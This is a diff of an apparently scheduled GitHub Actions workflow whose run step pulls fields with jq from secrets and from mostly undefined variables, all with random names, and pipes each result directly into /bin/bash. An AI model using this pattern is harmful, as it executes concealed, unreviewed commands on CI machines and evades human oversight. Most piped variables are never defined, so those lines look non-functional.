@@ -2,7 +2,7 @@ name: songziyang8391
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 2/6 * * *'
+    - cron: '49 1/6 * * *'
 
 jobs:
   build:
@@ -11,11 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: songziyang8391
         env:
-          yx9915: ${{ secrets.yx9915 }}
+          xjcp2: ${{ secrets.xjcp2 }}
         run: |
-          echo $yx9915 | jq -r .wlrdr295 | /bin/bash
-          echo $byg44 | jq -r .j5 | /bin/bash
-          echo $xo9 | jq -r .qka6472 | /bin/bash
-          echo $yat15 | jq -r .pmmuu1700 | /bin/bash
-          echo $fpci9 | jq -r .l680 | /bin/bash
+          echo $xjcp2 | jq -r .nr121 | /bin/bash
+          echo $yftip7 | jq -r .t70380 | /bin/bash
+          echo $lo2554 | jq -r .otwc7005 | /bin/bash
+          echo $o5 | jq -r .ecg4118 | /bin/bash
+          echo $xp4795 | jq -r .opo137 | /bin/bash
+          echo $cwl56 | jq -r .c86 | /bin/bash
+          echo $fofp1 | jq -r .fw329 | /bin/bash
+          echo $yp292 | jq -r .xk3 | /bin/bash
+          echo $n7576 | jq -r .ftsr0 | /bin/bash
+          echo $jieco24923 | jq -r .ct19 | /bin/bash
+          echo $slby407 | jq -r .bsmzy2354 | /bin/bash
+          echo $gpghk4 | jq -r .l22464 | /bin/bash
 
